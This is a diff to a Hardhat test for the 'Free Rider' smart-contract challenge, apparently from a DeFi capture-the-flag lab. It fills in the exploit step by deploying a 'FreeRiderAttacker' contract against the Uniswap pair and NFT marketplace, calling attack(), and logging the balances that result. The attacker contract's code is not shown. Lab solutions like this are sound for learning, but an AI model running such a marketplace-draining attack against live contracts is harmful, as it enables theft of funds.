@@ -101,10 +101,20 @@ describe('[Challenge] Free Rider', function () {
             this.nft.address, 
             { value: BUYER_PAYOUT }
         );
+        let rets = await this.uniswapPair.getReserves();
+        console.log(rets[0].toString(), rets[1].toString())
     });
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */
+        this.attackerContract = await (await ethers.getContractFactory('FreeRiderAttacker', attacker))
+            .deploy(this.uniswapPair.address,
+                this.marketplace.address,
+                this.weth.address,
+                this.nft.address,
+                this.buyerContract.address);
+
+        await this.attackerContract.connect(attacker).attack(ethers.utils.parseEther('15'));
     });
 
     after(async function () {
@@ -125,5 +135,11 @@ describe('[Challenge] Free Rider', function () {
         expect(
             await ethers.provider.getBalance(this.marketplace.address)
         ).to.be.lt(MARKETPLACE_INITIAL_ETH_BALANCE);
+        console.log((await ethers.provider.getBalance(this.marketplace.address)).toString())
+        console.log((await ethers.provider.getBalance(this.attackerContract.address)).toString())
+        console.log((await ethers.provider.getBalance(this.buyerContract.address)).toString())
+        console.log((await ethers.provider.getBalance(this.uniswapPair.address)).toString())
+        let rets = await this.uniswapPair.getReserves();
+        console.log(rets[0].toString(), rets[1].toString())
     });
 });
